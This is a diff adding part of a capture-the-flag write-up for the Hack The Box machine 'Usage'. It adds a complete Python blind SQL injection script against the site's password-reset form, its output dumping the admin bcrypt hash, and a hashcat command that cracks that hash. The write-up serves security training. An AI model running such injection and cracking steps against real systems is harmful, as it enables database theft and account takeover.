@@ -228,7 +228,220 @@ To save time, I wrote a `Python` script to automate exploitation:
 <br />
 
 ```python3 
+#!/usr/bin/env python3
 
+# Author: TheRedP4nther
+
+from termcolor import colored
+from pyfiglet import Figlet 
+import urllib.parse
+from pwn import *
+import requests
+import string
+import signal 
+import time
+import sys
+import re
+
+# Global Variables 
+url = "http://usage.htb/forget-password"
+characters = string.ascii_lowercase + "_-,$/.=:1234567890" + string.ascii_uppercase
+
+def def_handler(sig, frame):
+    print(colored("\n\n[!] Leaving the program...\n", "red"))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def banner():
+    f = Figlet(font="slant")
+    banner = f.renderText("TheRedP4nther")
+    print(colored(banner, "red"))
+
+def getCookies():
+    global session
+    session = requests.Session()
+    cookies = []
+
+    try:
+        r = session.get(url, timeout=3)
+        content = session.cookies.get_dict()
+        html = r.content.decode()
+        match = re.findall(r'value="(\w+)">', html)
+        if not match:
+            print(colored("\n[!] Error trying to get the token!\n", "red"))
+            sys.exit(1)
+        global token
+        token = match[0]
+
+    except requests.exceptions.RequestException:
+        print(colored("\n[!] Error trying to get the cookies!\n", "red"))
+        sys.exit(1)
+
+def getDatabases():
+    p1 = log.progress(colored("Exploiting Bind SQL Injection", "yellow"))
+    p2 = log.progress(colored("Databases", "yellow"))
+    content = ""
+
+    for i in range(1, 200):
+        for character in characters:
+            data = {
+                "_token": token,
+                "email": f"test' or substring(database(),{i},1)='{character}'-- -"
+            }
+
+            p1.status(colored(data['email'], "white"))
+
+            try: 
+                r = session.post(url, data=data, timeout=3)
+                if "We have e-mailed your password" in r.text:
+                    content += character
+                    p2.status(colored(content, "white"))
+                    if content.strip() == "usage_blog":
+                        return session, token
+                    break
+            except requests.exceptions.RequestException:
+                pass
+
+def getTables():
+    print(colored(f"\n[+] CURRENT DATABASE: usage_blog\n", "cyan"))
+    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
+    p2 = log.progress(colored("Tables", "yellow"))
+    content = ""
+    
+    for i in range(1, 1000):
+        for character in characters:
+            data = {
+                "_token": token,
+                "email": f"test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),{i},1)='{character}'-- -"
+            }
+
+            p1.status(colored(data['email'], "white"))
+
+            try: 
+                r = session.post(url, data=data, timeout=3)
+                if "We have e-mailed your password" in r.text:
+                    content += character 
+                    p2.status(colored(content, "white"))
+                    if content.strip() == "admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users":
+                        return session, token
+                    break
+            except requests.exceptions.RequestException:
+                pass
+
+def getColumns():
+    print(colored("\n[+] CURRENT TABLE: admin_users\n", "cyan"))
+    p1 = log.progress(colored("Exploting Blind SQL Injection", "yellow"))
+    p2 = log.progress(colored("Username And Password", "yellow"))
+    content = ""
+    
+    for i in range(1, 1000):
+        for character in characters:
+            data = {
+                "_token": token,
+                "email": f"test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),{i},1)='{character}'-- -"
+            }
+
+            p1.status(colored(data['email'], "white"))
+
+            try: 
+                r = session.post(url, data=data, timeout=3)
+                if "We have e-mailed your password" in r.text:
+                    content += character 
+                    p2.status(colored(content, "white"))
+                    if content.strip() == "admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2":
+                        print(colored("\n[+] USER: admin", "cyan"))
+                        print(colored("[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2","cyan"))
+                        print(colored("\n[+] Blind SQL Injection sucessfully exploited!\n", "green"))
+                        sys.exit(1)
+                    break
+            except requests.exceptions.RequestException:
+                pass
+
+def main():
+    banner()
+    getCookies()
+    getDatabases()
+    getTables()
+    getColumns()
+
+if __name__ == '__main__':
+    main()
 ```
 
 <br />
+
+We can execute and get the DB `user` and `hash`:
+
+<br />
+
+```bash
+❯ python3 exploit.py
+  ________         ____           ______  __ __        __  __             
+ /_  __/ /_  ___  / __ \___  ____/ / __ \/ // / ____  / /_/ /_  ___  _____
+  / / / __ \/ _ \/ /_/ / _ \/ __  / /_/ / // /_/ __ \/ __/ __ \/ _ \/ ___/
+ / / / / / /  __/ _, _/  __/ /_/ / ____/__  __/ / / / /_/ / / /  __/ /    
+/_/ /_/ /_/\___/_/ |_|\___/\__,_/_/      /_/ /_/ /_/\__/_/ /_/\___/_/     
+                                                                          
+
+[▗] Exploiting Bind SQL Injection: test' or substring(database(),10,1)='g'-- -
+[◐] Databases: usage_blog
+
+[+] CURRENT DATABASE: usage_blog
+
+[▁] Exploting Blind SQL Injection: test' or substring((select group_concat(table_name) from information_schema.tables where table_schema='usage_blog'),151,1)='s'-- -
+[*] Tables: admin_menu,admin_operation_log,admin_permissions,admin_role_menu,admin_role_permissions,admin_role_users,admin_roles,admin_user_permissions,admin_users
+
+[+] CURRENT TABLE: admin_users
+
+[◣] Exploting Blind SQL Injection: test' or substring((select group_concat((BINARY username), ':', (BINARY password)) from admin_users),66,1)='2'-- -
+[/] Username And Password: admin:$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
+
+[+] USER: admin
+[+] HASH: $2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2
+
+[+] Blind SQL Injection sucessfully exploited!
+```
+
+<br />
+
+Nice! We did it!.
+
+Now we can crack the Blowfish Bcrypt hash with `hashcat`:
+
+<br />
+
+```bash
+❯ hashcat -a 0 -m 3200 hash /usr/share/wordlists/rockyou.txt
+hashcat (v6.2.6) starting
+...[snip]...
+$2y$10$ohq2kLpBH/ri.P5wR0P3UOmc24Ydvl9DA9H1S6ooOMgH5xVfUPrL2:whatever1 
+...[snip]...
+```
+
+<br />
+
+We have a password.
+
+<br />
+
+## Laravel Authenticated RCE:
+
+<br />
+
+Using it we can log into the `admin.usage.htb` login panel:
+
+<br />
+
+
+
+<br />
+
+As we can see, we are inside a laravel interface.
+
+What is Laravel?
+
+Laravel is a `PHP-based` web framework for building, deploying and monitoring web applications.
+
+<br />
+
